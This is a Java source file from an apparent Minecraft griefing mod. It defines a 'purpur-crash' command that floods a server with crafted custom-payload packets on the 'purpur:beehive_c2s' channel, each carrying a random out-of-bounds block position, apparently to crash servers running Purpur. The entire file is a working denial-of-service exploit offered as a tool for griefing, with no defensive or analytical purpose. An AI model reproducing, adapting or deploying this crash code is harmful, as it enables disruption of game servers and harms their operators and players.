package griefingutils.commands;

import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import net.minecraft.command.CommandSource;
import net.minecraft.util.Identifier;
import net.minecraft.util.math.BlockPos;

public class PurpurCrash extends BetterCommand {
    public PurpurCrash() {
        super("purpur-crash", "Sends funny CustomPayloadC2S packets to the server");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(
            argument("strength", IntegerArgumentType.integer(1))
                .executes(this::run)
        );
    }

    private int run(CommandContext<CommandSource> ctx) {
        int packets = IntegerArgumentType.getInteger(ctx, "strength");
        info("Sending %d packet(s)".formatted(packets));
        for (int i = 0; i < packets; i++) {
            int x = (int) ((Math.random() - 0.5) * 60_000_000);
            int y = (int) ((Math.random() - 0.5) * 60_000_000);
            sendPacket(createCustomPayloadPacket(
                buf -> {
                    long l = new BlockPos(x, (int) (Math.random() * 4 + 250), y).asLong();
                    buf.writeLong(l);
                }, new Identifier("purpur", "beehive_c2s")
            ));
        }
        return SUCCESS;
    }
}
